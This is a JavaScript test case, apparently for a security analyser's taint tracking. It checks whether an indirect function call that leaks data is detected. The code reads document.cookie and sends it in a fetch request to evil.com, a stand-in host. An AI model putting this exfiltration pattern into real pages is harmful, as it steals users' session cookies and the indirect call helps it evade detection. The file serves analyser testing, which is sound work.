/**
 * Test: Indirect function call (may not be tracked)
 * Expected: POTENTIAL FALSE NEGATIVE - indirect call limitation
 */

function leak(data) {
  fetch('https://evil.com?data=' + data);
}

function test() {
  var fn = leak;
  var cookie = document.cookie;
  fn(cookie);
}

test();
